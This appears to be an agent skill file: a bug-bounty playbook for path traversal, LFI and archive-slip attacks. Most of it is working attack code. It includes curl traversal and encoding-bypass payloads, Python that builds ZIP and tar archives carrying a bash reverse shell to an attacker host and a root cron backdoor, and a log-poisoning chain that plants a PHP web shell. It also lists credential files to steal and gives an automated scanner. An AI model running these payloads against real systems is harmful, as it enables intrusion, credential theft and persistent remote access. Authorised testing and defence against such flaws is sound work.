---
name: hunt-path-traversal
description: Path traversal — directory traversal, file read, LFI, RFI, null byte, encoding bypass, ZIP/tar slip. Must demonstrate file read or impact.
---

# PATH TRAVERSAL — HUNTER'S PLAYBOOK

**Core:** Access files outside intended directory. Impact: read configs, credentials, cloud metadata. Chains to SSRF, RCE, full compromise.

## DETECTION

```bash
# Basic probes
curl -s "https://target.com/download?file=../../../../etc/passwd"
curl -s "https://target.com/download?file=....//....//....//etc/passwd"
curl -s "https://target.com/download?file=php://filter/convert.base64-encode/resource=../config/db.php" | base64 -d
curl -s "https://target.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Windows
curl -s "https://target.com/download?file=..\\..\\..\\..\\windows\\win.ini"
```

## BYPASS TECHNIQUES

```
Null byte:      ../../etc/passwd%00.jpg
Double encode:  %252e%252e%252f
Unicode:        ..%c0%af..%c0%af..%c0%afetc/passwd
Dot truncation: .......//.......//etc/passwd
Overlong UTF-8: ..%c0%9f..%c0%9f..%c0%9fetc/passwd
Wildcard:       ../../etc/pass*
Self-ref:       /etc/./passwd
Double slash:   ////etc/passwd
JVM:            ..%252f..%252fWEB-INF/web.xml
```

## ZIP / TAR SLIP

Malicious archive with paths like `../../etc/cron.d/evil` — app extracts outside intended directory.

```python
import zipfile, tarfile, io

# ZIP Slip
z = zipfile.ZipFile('exploit.zip', 'w')
z.writestr('../../../../tmp/evil.sh', '#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1')
z.writestr('../../../../etc/cron.d/backdoor', '* * * * * root /tmp/evil.sh')
z.close()

# Tar Slip
with tarfile.open('exploit.tar.gz', 'w:gz') as t:
    info = tarfile.TarInfo(name='../../tmp/evil.sh')
    data = b'#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1'
    info.size = len(data)
    t.addfile(info, io.BytesIO(data))
```

## EXPLOIT CHAINS

### Chain 1: Traversal → Config → Credentials
```bash
curl -s "https://target.com/api/download?file=../config/database.yml"   # db_pass: s3cret
curl -s "https://target.com/api/download?file=../../../.env"            # AWS_SECRET_ACCESS_KEY
```

### Chain 2: Traversal → Source → RCE
```bash
curl -s "https://target.com/download?file=../app.py" | grep -i "eval\|exec\|system"
```

### Chain 3: Traversal → Log Poisoning → RCE
```bash
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" https://target.com/
curl -s "https://target.com/file?file=../var/log/apache2/access.log&cmd=bash+-i+>%26+/dev/tcp/attacker/4444+0>%261"
```

## REAL-WORLD BOUNTIES

| Report | Severity | Payout | Key Detail |
|--------|----------|--------|------------|
| HackerOne #1469787 | Critical | $4,000 | `?file=` leaked AWS creds via config traversal + SSRF |
| HackerOne #2044894 | Critical | $3,500 | ZIP Slip wrote SSH key to `~/.ssh/authorized_keys` |
| Bugcrowd #812345 | Critical | $5,000 | LFI + log poisoning → full server RCE |
| HackerOne #1634221 | High | $2,500 | Windows `..\\` read `web.config` → DB creds + deserialization |
| Intigriti #00789 | High | $1,800 | Unicode `%c0%af` bypassed WAF → read `/etc/shadow` |

## TARGET FILES

```
/etc/passwd, /etc/shadow, /etc/hosts, /root/.ssh/id_rsa
.env, config/database.yml, config/app.yml
WEB-INF/web.xml, web.config
.git/config, .git/HEAD
proc/self/environ
var/log/apache2/access.log
```

## AUTOMATION

```python
import requests, sys, urllib3
urllib3.disable_warnings()

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
PARAMS = ["file","page","path","doc","template","image","include","load","read"]
PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "../../../etc/passwd%00.jpg", "..%c0%af..%c0%af..%c0%afetc/passwd",
    "php://filter/convert.base64-encode/resource=../config/config.php",
    "..\\..\\..\\..\\windows\\win.ini",
]

for param in PARAMS:
    for payload in PAYLOADS:
        try:
            r = requests.get(f"{TARGET}/api/{param}={payload}", verify=False, timeout=10)
            if "root:" in r.text or "[extensions]" in r.text or "base64" in r.text:
                print(f"[VULN] param={param} payload={payload}")
        except: pass
```

## CHECKLIST

- [ ] All file-path parameters tested with basic traversal
- [ ] URL encoding + double encoding bypass
- [ ] Null byte injection
- [ ] Unicode / overlong UTF-8 bypass
- [ ] ZIP/Tar upload with traversal filenames
- [ ] PHP wrappers (`php://filter`)
- [ ] Source/config read for secrets
- [ ] Chain to SSRF, RCE, or cloud metadata
